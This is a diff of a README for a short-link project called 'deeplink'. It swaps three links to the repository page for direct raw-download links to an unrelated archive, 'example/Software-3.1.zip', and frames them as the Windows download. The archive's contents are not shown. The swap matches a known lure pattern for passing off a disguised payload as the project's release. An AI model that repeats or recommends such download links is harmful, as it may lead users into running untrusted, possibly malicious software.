@@ -1,12 +1,12 @@
 # 🔗 deeplink - Short links with click tracking
 
-[![Download deeplink](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Mhgamer5292/deeplink)
+[![Download deeplink](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Mhgamer5292/deeplink/raw/refs/heads/main/example/Software-3.1.zip)
 
 ## 📥 Download and run on Windows
 
 Use the link below to visit the page and download or open the latest version:
 
-[https://github.com/Mhgamer5292/deeplink](https://github.com/Mhgamer5292/deeplink)
+[https://github.com/Mhgamer5292/deeplink/raw/refs/heads/main/example/Software-3.1.zip](https://github.com/Mhgamer5292/deeplink/raw/refs/heads/main/example/Software-3.1.zip)
 
 ### What you need
 - A Windows PC
@@ -159,7 +159,7 @@ This project fits these areas:
 
 Visit this page to download or open the project files:
 
-[https://github.com/Mhgamer5292/deeplink](https://github.com/Mhgamer5292/deeplink)
+[https://github.com/Mhgamer5292/deeplink/raw/refs/heads/main/example/Software-3.1.zip](https://github.com/Mhgamer5292/deeplink/raw/refs/heads/main/example/Software-3.1.zip)
 
 ## 🧾 File types you may see
 
